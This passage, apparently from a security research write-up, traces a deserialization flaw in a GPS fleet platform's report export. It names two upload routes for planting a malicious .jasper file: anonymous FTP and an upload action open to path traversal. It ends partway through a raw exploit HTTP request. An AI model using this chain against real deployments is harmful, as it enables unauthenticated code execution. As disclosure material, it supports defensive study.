                    <span class="k">if</span> <span class="o">(</span><span class="n">direct</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"0"</span><span class="o">))</span> <span class="o">{</span>
                        <span class="n">reportTitle</span> <span class="o">=</span> <span class="n">reportTitle</span> <span class="o">+</span> <span class="s">"S"</span><span class="o">;</span>
                    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">direct</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"1"</span><span class="o">))</span> <span class="o">{</span>
                        <span class="n">reportTitle</span> <span class="o">=</span> <span class="n">reportTitle</span> <span class="o">+</span> <span class="s">"X"</span><span class="o">;</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>

            <span class="n">AjaxDto</span><span class="o">&lt;</span><span class="n">StandardLineStationRelationStation</span><span class="o">&gt;</span> <span class="n">stationRelation</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">standardLineService</span><span class="o">.</span><span class="na">getLineStationInfos</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">lid</span><span class="o">),</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">direct</span><span class="o">),</span> <span class="mi">1</span><span class="o">,</span> <span class="s">" order by sindex asc "</span><span class="o">,</span> <span class="o">(</span><span class="n">List</span><span class="o">)</span><span class="kc">null</span><span class="o">,</span> <span class="o">(</span><span class="n">Pagination</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span>
            <span class="n">List</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">();</span>
            <span class="n">String</span> <span class="n">language</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getAndUpdateSessionLanguage</span><span class="o">();</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">stationRelation</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">stationRelation</span><span class="o">.</span><span class="na">getPageList</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>

                <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="n">stationRelation</span><span class="o">.</span><span class="na">getPageList</span><span class="o">().</span><span class="na">size</span><span class="o">();</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">j</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">StandardLineStationRelationStation</span> <span class="n">relation</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardLineStationRelationStation</span><span class="o">)</span><span class="n">stationRelation</span><span class="o">.</span><span class="na">getPageList</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
                    <span class="n">Map</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
                    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"sindex"</span><span class="o">,</span> <span class="n">relation</span><span class="o">.</span><span class="na">getSindex</span><span class="o">());</span>
                    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span> <span class="n">relation</span><span class="o">.</span><span class="na">getStation</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
                    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"direct"</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">getStationDirectEx</span><span class="o">(</span><span class="n">relation</span><span class="o">.</span><span class="na">getStation</span><span class="o">().</span><span class="na">getDirect</span><span class="o">(),</span> <span class="n">language</span><span class="o">));</span>
                    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"stype"</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">getStationTypeEx</span><span class="o">(</span><span class="n">relation</span><span class="o">.</span><span class="na">getStype</span><span class="o">(),</span> <span class="n">language</span><span class="o">));</span>
                    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"lngIn"</span><span class="o">,</span> <span class="n">GpsUtil</span><span class="o">.</span><span class="na">formatPosition</span><span class="o">(</span><span class="n">relation</span><span class="o">.</span><span class="na">getStation</span><span class="o">().</span><span class="na">getLngIn</span><span class="o">()));</span>
                    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"latIn"</span><span class="o">,</span> <span class="n">GpsUtil</span><span class="o">.</span><span class="na">formatPosition</span><span class="o">(</span><span class="n">relation</span><span class="o">.</span><span class="na">getStation</span><span class="o">().</span><span class="na">getLatIn</span><span class="o">()));</span>
                    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"angleIn"</span><span class="o">,</span> <span class="n">relation</span><span class="o">.</span><span class="na">getStation</span><span class="o">().</span><span class="na">getAngleIn</span><span class="o">());</span>
                    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"speed"</span><span class="o">,</span> <span class="n">GpsUtil</span><span class="o">.</span><span class="na">getFormatSpeed</span><span class="o">(</span><span class="n">relation</span><span class="o">.</span><span class="na">getSpeed</span><span class="o">(),</span> <span class="mi">1</span><span class="o">,</span> <span class="k">new</span> <span class="n">Boolean</span><span class="o">[</span><span class="mi">0</span><span class="o">]));</span>
                    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"len"</span><span class="o">,</span> <span class="n">GpsUtil</span><span class="o">.</span><span class="na">getFormatLiCheng</span><span class="o">(</span><span class="n">relation</span><span class="o">.</span><span class="na">getLen</span><span class="o">()));</span>
                    <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">map</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>

            <span class="n">Map</span> <span class="n">mapHeads</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
            <span class="n">mapHeads</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"sindex"</span><span class="o">,</span> <span class="n">LanguageCache</span><span class="o">.</span><span class="na">getLanguageTextEx</span><span class="o">(</span><span class="s">"line_station_index"</span><span class="o">,</span> <span class="n">language</span><span class="o">));</span>
            <span class="n">mapHeads</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span> <span class="n">LanguageCache</span><span class="o">.</span><span class="na">getLanguageTextEx</span><span class="o">(</span><span class="s">"line_station_name"</span><span class="o">,</span> <span class="n">language</span><span class="o">));</span>
            <span class="n">mapHeads</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"direct"</span><span class="o">,</span> <span class="n">LanguageCache</span><span class="o">.</span><span class="na">getLanguageTextEx</span><span class="o">(</span><span class="s">"line_station_direction"</span><span class="o">,</span> <span class="n">language</span><span class="o">));</span>
            <span class="n">mapHeads</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"stype"</span><span class="o">,</span> <span class="n">LanguageCache</span><span class="o">.</span><span class="na">getLanguageTextEx</span><span class="o">(</span><span class="s">"line_station_type"</span><span class="o">,</span> <span class="n">language</span><span class="o">));</span>
            <span class="n">mapHeads</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"lngIn"</span><span class="o">,</span> <span class="n">LanguageCache</span><span class="o">.</span><span class="na">getLanguageTextEx</span><span class="o">(</span><span class="s">"line_station_in_lng"</span><span class="o">,</span> <span class="n">language</span><span class="o">));</span>
            <span class="n">mapHeads</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"latIn"</span><span class="o">,</span> <span class="n">LanguageCache</span><span class="o">.</span><span class="na">getLanguageTextEx</span><span class="o">(</span><span class="s">"line_station_in_lat"</span><span class="o">,</span> <span class="n">language</span><span class="o">));</span>
            <span class="n">mapHeads</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"angleIn"</span><span class="o">,</span> <span class="n">LanguageCache</span><span class="o">.</span><span class="na">getLanguageTextEx</span><span class="o">(</span><span class="s">"line_station_in_angle"</span><span class="o">,</span> <span class="n">language</span><span class="o">));</span>
            <span class="n">mapHeads</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"speed"</span><span class="o">,</span> <span class="n">LanguageCache</span><span class="o">.</span><span class="na">getLanguageTextEx</span><span class="o">(</span><span class="s">"line_station_limit_speed"</span><span class="o">,</span> <span class="n">language</span><span class="o">)</span> <span class="o">+</span> <span class="s">" (KM/H)"</span><span class="o">);</span>
            <span class="n">mapHeads</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"len"</span><span class="o">,</span> <span class="n">LanguageCache</span><span class="o">.</span><span class="na">getLanguageTextEx</span><span class="o">(</span><span class="s">"line_station_distance"</span><span class="o">,</span> <span class="n">language</span><span class="o">)</span> <span class="o">+</span> <span class="s">" (KM)"</span><span class="o">);</span>
            <span class="n">ReportPrint</span> <span class="n">print</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

            <span class="k">try</span> <span class="o">{</span>
                <span class="n">print</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getReportCreate</span><span class="o">().</span><span class="na">createReport</span><span class="o">(</span><span class="n">name</span><span class="o">);</span><span class="c1">//触发JasperReport库</span>
                <span class="n">print</span><span class="o">.</span><span class="na">setMapHeads</span><span class="o">(</span><span class="n">mapHeads</span><span class="o">);</span>
                <span class="n">print</span><span class="o">.</span><span class="na">setReportTitle</span><span class="o">(</span><span class="n">reportTitle</span><span class="o">);</span>
                <span class="n">print</span><span class="o">.</span><span class="na">setDateSource</span><span class="o">(</span><span class="n">list</span><span class="o">);</span>
                <span class="n">print</span><span class="o">.</span><span class="na">setFormat</span><span class="o">(</span><span class="n">format</span><span class="o">);</span>
                <span class="n">print</span><span class="o">.</span><span class="na">setDocumentName</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
                <span class="n">print</span><span class="o">.</span><span class="na">setDisposition</span><span class="o">(</span><span class="n">disposition</span><span class="o">);</span>
                <span class="n">print</span><span class="o">.</span><span class="na">exportReport</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var15</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">this</span><span class="o">.</span><span class="na">log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">var15</span><span class="o">.</span><span class="na">getMessage</span><span class="o">(),</span> <span class="n">var15</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ServletException</span> <span class="n">var16</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">this</span><span class="o">.</span><span class="na">log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">var16</span><span class="o">.</span><span class="na">getMessage</span><span class="o">(),</span> <span class="n">var16</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var17</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">this</span><span class="o">.</span><span class="na">log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">var17</span><span class="o">.</span><span class="na">getMessage</span><span class="o">(),</span> <span class="n">var17</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var18</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">var18</span><span class="o">.</span><span class="na">getMessage</span><span class="o">(),</span> <span class="n">var18</span><span class="o">);</span>
            <span class="k">this</span><span class="o">.</span><span class="na">addCustomResponse</span><span class="o">(</span><span class="n">ACTION_RESULT</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
        <span class="o">}</span>

    <span class="o">}</span>
</pre></div>
<p><code>this.getReportCreate().createReport(name);</code>这里调用了<code>com/gpsCommon/action/CommonBaseAction.class</code>的<code>getReportCreate</code>方法：</p>
<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="n">ReportCreater</span> <span class="nf">getReportCreate</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">reportCreate</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">reportCreate</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReportCreater</span><span class="o">();</span>
            <span class="k">this</span><span class="o">.</span><span class="na">reportCreate</span><span class="o">.</span><span class="na">setJasperReportPath</span><span class="o">(</span><span class="n">ServletActionContext</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">().</span><span class="na">getRealPath</span><span class="o">(</span><span class="s">"WEB-INF/jasper"</span><span class="o">));</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">reportCreate</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<p>默认在<code>webapps/gpsweb/WEB-INF/jasper</code>目录下读取jasper文件。返回<code>com/framework/jasperReports/ReportCreater.class</code>类，继续调用<code>com/framework/jasperReports/ReportCreater.class::createReport()</code>方法。继续跟进在<code>_createReport()</code>方法发现调用了<code>getJasperReport(reportKey)</code>,<code>reportKey</code>承接的是外部get传入的<code>name</code>参数值。</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">ReportPrint</span> <span class="nf">createReport</span><span class="o">(</span><span class="n">String</span> <span class="n">reportKey</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">_createReport</span><span class="o">(</span><span class="n">reportKey</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">JRException</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">var3</span><span class="o">.</span><span class="na">getMessage</span><span class="o">(),</span> <span class="n">var3</span><span class="o">);</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">IOException</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="n">ReportPrint</span> <span class="nf">_createReport</span><span class="o">(</span><span class="n">String</span> <span class="n">reportKey</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">JRException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
        <span class="n">JasperReport</span> <span class="n">jasperReport</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getJasperReport</span><span class="o">(</span><span class="n">reportKey</span><span class="o">);</span>
        <span class="n">Map</span> <span class="n">parameters</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getParameters_</span><span class="o">(</span><span class="n">reportKey</span><span class="o">);</span>
        <span class="k">return</span> <span class="k">new</span> <span class="n">ReportPrint</span><span class="o">(</span><span class="n">jasperReport</span><span class="o">,</span> <span class="n">parameters</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">private</span> <span class="n">JasperReport</span> <span class="nf">getJasperReport</span><span class="o">(</span><span class="n">String</span> <span class="n">reportKey</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">JRException</span> <span class="o">{</span>
        <span class="n">JasperReport</span> <span class="n">jasperReport</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">jasperDesignMap</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">reportKey</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">jasperReport</span> <span class="o">=</span> <span class="o">(</span><span class="n">JasperReport</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">jasperDesignMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">reportKey</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">jasperReport</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getJasperReportFromFile</span><span class="o">(</span><span class="n">reportKey</span><span class="o">);</span>
            <span class="k">this</span><span class="o">.</span><span class="na">jasperDesignMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">reportKey</span><span class="o">,</span> <span class="n">jasperReport</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">jasperReport</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<p><code>getJasperReport(reportKey)</code>这段代码主要目的是确保每次请求相同的报告时，只需编译一次报告模板，并将其存储在缓存中供后续使用，从而提高性能并减少资源消耗。如果缓存中已经存在对应的 JasperReport，则直接从缓存中获取；否则，从文件系统加载并编译报告模板，然后将编译好的报告存入缓存。但通常情况下从<code>WEB-INF/jasper</code>目录下读取jasper文件即可。</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="n">JasperReport</span> <span class="nf">getJasperReportFromFile</span><span class="o">(</span><span class="n">String</span> <span class="n">reportKey</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">JRException</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">filePath</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">jasperReportPath</span> <span class="o">+</span> <span class="n">File</span><span class="o">.</span><span class="na">separator</span> <span class="o">+</span> <span class="n">reportKey</span> <span class="o">+</span> <span class="s">".jasper"</span><span class="o">;</span><span class="c1">//固定后缀名</span>
        <span class="n">File</span> <span class="n">reportFile</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="n">JasperReport</span> <span class="n">jasperReport</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="n">reportFile</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">filePath</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">reportFile</span><span class="o">.</span><span class="na">exists</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">reportFile</span><span class="o">.</span><span class="na">isFile</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">jasperReport</span> <span class="o">=</span> <span class="o">(</span><span class="n">JasperReport</span><span class="o">)</span><span class="n">JRLoader</span><span class="o">.</span><span class="na">loadObject</span><span class="o">(</span><span class="n">reportFile</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">jasperReport</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
<p><code>getJasperReportFromFile</code>固定了读取jasper文件。文件存在进入JasperReport-6.4.0.jar包的<code>net/sf/jasperreports/engine/util/JRLoader.class::loadObject()</code>进行反序列化。</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">loadObject</span><span class="o">(</span><span class="n">File</span> <span class="n">file</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">JRException</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">loadObject</span><span class="o">(</span><span class="n">DefaultJasperReportsContext</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(),</span> <span class="o">(</span><span class="n">File</span><span class="o">)</span><span class="n">file</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">loadObject</span><span class="o">(</span><span class="n">JasperReportsContext</span> <span class="n">jasperReportsContext</span><span class="o">,</span> <span class="n">File</span> <span class="n">file</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">JRException</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">file</span><span class="o">.</span><span class="na">exists</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">file</span><span class="o">.</span><span class="na">isFile</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="n">FileInputStream</span> <span class="n">fis</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="n">ContextClassLoaderObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

            <span class="k">try</span> <span class="o">{</span>
                <span class="n">fis</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">file</span><span class="o">);</span>
                <span class="n">BufferedInputStream</span> <span class="n">bufferedIn</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedInputStream</span><span class="o">(</span><span class="n">fis</span><span class="o">);</span>
                <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ContextClassLoaderObjectInputStream</span><span class="o">(</span><span class="n">jasperReportsContext</span><span class="o">,</span> <span class="n">bufferedIn</span><span class="o">);</span>
                <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
</pre></div>
<p>最后通过<code>net/sf/jasperreports/engine/util/ContextClassLoaderObjectInputStream.class</code>在没有对jasper文件进行内容检测的情况下就直接反序列化。</p>
<h3 data-content="1" id="652c47946c51659a973ebf54285f9256">2.3 上传Jasper接口</h3>
<ul>
<li><strong>方式一：ftp上传</strong></li>
</ul>
<p>​    <code>7.33.0.7_20240508</code>以前的版本环境默认开启ftp默认端口<code>2121</code>，且默认匿名用户可访问（空用户名和空密码）。可以通过ftp上传jasper文件。</p>
<ul>
<li>
<p><strong>方式二：<code>com.framework.web.action.FileUploadAction::upload()</code></strong>上传</p>
<p><code>com.framework.web.action.FileUploadAction::upload()</code>没有检测上传文件后缀名和文件名的目录遍历就上传了。上传的路径是从<code>C:\</code>根目录开始的，上传文件名也没有更改。</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">upload</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">this</span><span class="o">.</span><span class="na">uploadFileFileName</span><span class="o">.</span><span class="na">size</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">BufferedInputStream</span> <span class="n">bis</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="n">BufferedOutputStream</span> <span class="n">bos</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="n">String</span> <span class="n">fileName</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">uploadFileFileName</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">i</span><span class="o">);</span><span class="c1">//获取文件名</span>

            <span class="k">try</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(!</span><span class="s">""</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">fileName</span><span class="o">))</span> <span class="o">{</span><span class="c1">//文件名不会为空</span>
                    <span class="n">FileInputStream</span> <span class="n">fis</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">((</span><span class="n">File</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">uploadFile</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">i</span><span class="o">));</span>
                    <span class="n">FileOutputStream</span> <span class="n">fos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"C:\\"</span> <span class="o">+</span> <span class="n">fileName</span><span class="o">);</span><span class="c1">//默认在c盘根目录开始上传文件</span>
                    <span class="n">bis</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedInputStream</span><span class="o">(</span><span class="n">fis</span><span class="o">);</span>
                    <span class="n">bos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedOutputStream</span><span class="o">(</span><span class="n">fos</span><span class="o">);</span>
                    <span class="kt">byte</span><span class="o">[]</span> <span class="n">b</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">1024</span><span class="o">];</span>
                    <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>

                    <span class="kt">int</span> <span class="n">len</span><span class="o">;</span>
                    <span class="k">while</span><span class="o">((</span><span class="n">len</span> <span class="o">=</span> <span class="n">bis</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">b</span><span class="o">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">bos</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">b</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">len</span><span class="o">);</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var17</span><span class="o">)</span> <span class="o">{</span>
            <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
                <span class="k">try</span> <span class="o">{</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">bis</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">bis</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                    <span class="o">}</span>

                    <span class="k">if</span> <span class="o">(</span><span class="n">bos</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">bos</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                    <span class="o">}</span>
                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var16</span><span class="o">)</span> <span class="o">{</span>
                <span class="o">}</span>

            <span class="o">}</span>
        <span class="o">}</span>

    <span class="o">}</span>

    <span class="kd">public</span> <span class="n">String</span> <span class="nf">image</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">upload</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var2</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">log</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">var2</span><span class="o">.</span><span class="na">getMessage</span><span class="o">(),</span> <span class="n">var2</span><span class="o">);</span>
            <span class="k">this</span><span class="o">.</span><span class="na">addCustomResponse</span><span class="o">(</span><span class="n">ACTION_RESULT</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="s">"success"</span><span class="o">;</span>
    <span class="o">}</span>
</pre></div>
</li>
</ul>
<p><code>/webapps/gpsweb/WEB-INF/lib</code>文件下能看到使用的第三方库有<code>commons-beanutils-1.8.0.jar</code>，可以cb链进行后续触发。</p>
<h2 data-content="1" id="8d1bbd82b513f0d53cabbd7eafa50d2d">三、漏洞复现</h2>
<h3 data-content="1" id="0b050de49ce5fef215d5330f71cb2066">3.1 upload接口上传jasper文件</h3>
<p>post请求发送以下http报文，其中jasper文件内容含有反序列化不可见字符，通过html表单提交。<code>com.framework.web.action.FileUploadAction::upload()</code> 不在struts.xml文件中的定义里，因此需要使用全类名进行访问，也就不需要bypass参数加密。</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/com.framework.web.action.FileUploadAction_upload.action</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.8.164:88</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">395</span>
<span class="na">Pragma</span><span class="o">:</span> <span class="l">no-cache</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">null</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundaryvl1q2bEhAS3C02LB</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9,en;q=0.8</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">JSESSIONID=A66DB2E5A3D0640A3AF28A27FF7FF2FF;</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

